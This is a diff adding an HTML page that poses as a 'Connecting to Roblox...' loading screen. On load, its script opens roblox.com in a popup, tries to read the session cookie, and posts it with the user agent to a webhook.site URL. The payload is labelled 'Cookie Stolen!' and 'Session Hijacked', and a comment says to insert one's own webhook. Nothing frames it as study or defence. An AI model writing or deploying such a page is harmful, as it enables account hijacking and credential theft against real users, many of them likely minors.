@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+    <div>Connecting to Roblox...</div>
+    <script>
+        // REPLACE THIS WITH YOUR WEBHOOK.SITE URL FROM THE PAGE YOU ARE LOOKING AT
+        const WEBHOOK_URL = "https://webhook.site/3f899a22-0936-4f05-827f-8e24d5d0dcc1";
+
+        async function steal() {
+            try {
+                // 1. Open Roblox in a popup
+                const win = window.open("https://www.roblox.com/home", "_blank", "width=800,height=600");
+               
+                // Wait for the popup to load
+                await new Promise(r => setTimeout(r, 3000));
+
+                // 2. Get the cookie from the popup window
+                let cookieData = "";
+                try {
+                    // Accessing document.cookie in the popup window
+                    cookieData = win.document.cookie;
+                } catch (e) {
+                    cookieData = "Popup blocked or cross-origin error.";
+                }
+
+                // 3. Send the data as a structured JSON object
+                const payload = {
+                    content: "🎣 **Cookie Stolen!** ``` " + cookieData + " ```",
+                    embeds: [{
+                        title: "Session Hijacked",
+                        description: "Roblox session captured.",
+                        color: 15158332,
+                        fields: [
+                            { name: "User Agent", value: navigator.userAgent, inline: false },
+                            { name: "IP Address", value: "Check Raw Request below", inline: false }
+                        ]
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Optional: Close the popup after stealing
+                win.close();
+                document.body.innerHTML = "<div>Success! Check your webhook.</div>";
+
+            } catch (err) {
+                console.error(err);
+                document.body.innerHTML = "<div>Error: " + err.message + "</div>";
+            }
+        }
+
+        // Run the script
+        steal();
+    </script>
+</body>
+</html>
